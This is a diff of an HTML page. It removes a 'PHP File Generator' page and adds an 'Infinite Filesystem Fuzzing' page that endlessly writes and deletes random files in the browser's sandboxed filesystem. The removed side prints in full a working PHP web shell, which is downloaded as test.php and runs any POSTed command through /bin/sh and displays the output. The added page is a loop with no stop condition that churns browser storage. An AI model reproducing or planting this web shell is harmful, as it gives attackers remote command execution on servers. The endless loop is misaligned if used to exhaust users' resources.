@@ -1,71 +1,69 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PHP File Generator</title>
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
+  <meta charset="UTF-8">
+  <title>Infinite Filesystem Fuzzing</title>
+  <script>
+    const storageSize = 10 * 1024 * 1024; // 10MB sandbox
+
+    function randomFileName() {
+      return 'fuzz_' + Math.random().toString(36).substr(2, 8) + '.txt';
     }
-  </style>
+
+    function fuzzingLoop(fs) {
+      const fileName = randomFileName();
+      
+      fs.root.getFile(fileName, { create: true }, function(fileEntry) {
+        fileEntry.createWriter(function(fileWriter) {
+          const content = 'Fuzz Content: ' + Math.random();
+          const blob = new Blob([content], { type: 'text/plain' });
+
+          fileWriter.onwriteend = function() {
+            console.log('File dibuat:', fileName);
+            
+            // Setelah menulis, langsung hapus file
+            fileEntry.remove(function() {
+              console.log('File dihapus:', fileName);
+              // Lanjut ke iterasi berikutnya
+              setTimeout(() => fuzzingLoop(fs), 0); // next tick
+            }, function(err) {
+              console.error('Gagal menghapus file:', fileName, err);
+              setTimeout(() => fuzzingLoop(fs), 0); // tetap lanjut
+            });
+          };
+
+          fileWriter.onerror = function(err) {
+            console.error('Gagal menulis file:', fileName, err);
+            setTimeout(() => fuzzingLoop(fs), 0); // tetap lanjut meski error
+          };
+
+          fileWriter.write(blob);
+        }, function(err) {
+          console.error('Gagal membuat writer untuk:', fileName, err);
+          setTimeout(() => fuzzingLoop(fs), 0);
+        });
+      }, function(err) {
+        console.error('Gagal membuat file:', fileName, err);
+        setTimeout(() => fuzzingLoop(fs), 0);
+      });
+    }
+
+    window.onload = function() {
+      if (!window.webkitRequestFileSystem) {
+        console.error("Browser tidak mendukung FileSystem API.");
+        return;
+      }
+
+      window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
+        console.log('Mulai infinite fuzzing loop...');
+        fuzzingLoop(fs);
+      }, function(err) {
+        console.error('Gagal mengakses FileSystem API:', err);
+      });
+    };
+  </script>
 </head>
 <body>
-  <h1>PHP File Generator</h1>
-  <p>Click the button below to generate and download a PHP file.</p>
-  <button class="button" onclick="downloadPHPFile()">Download PHP File</button>
-
-  <script>
-    function downloadPHPFile() {
-      const phpContent = `<?php
-if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['cmd'])) {
-    \$cmd = trim(\$_POST['cmd']);
-    if (\$cmd !== '') {
-        \$tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
-        if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
-            \$pid = pcntl_fork();
-            if (\$pid == -1) {
-                echo "Fork failed.";
-            } elseif (\$pid === 0) {
-                pcntl_exec('/bin/sh', ['-c', \$cmd . " > \$tmpFile 2>&1"]);
-                exit(1);
-            } else {
-                pcntl_wait(\$status);
-                if (file_exists(\$tmpFile)) {
-                    echo "<pre>" . htmlspecialchars(file_get_contents(\$tmpFile)) . "</pre>";
-                    unlink(\$tmpFile);
-                } else {
-                    echo "No output.";
-                }
-            }
-        } else {
-            echo "pcntl functions not available.";
-        }
-    }
-}
-?>
-<form method="post">
-    <input type="text" name="cmd" placeholder="Enter command" />
-    <input type="submit" value="Run" />
-</form>`;
-
-      const blob = new Blob([phpContent], { type: 'text/x-php' });
-      const link = document.createElement('a');
-      link.href = URL.createObjectURL(blob);
-      link.download = 'test.php';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-  </script>
+  <h1>Infinite Filesystem Fuzzing Test (No Alert)</h1>
+  <p>Fuzzing berjalan tanpa henti. Lihat console untuk progress.</p>
 </body>
 </html>
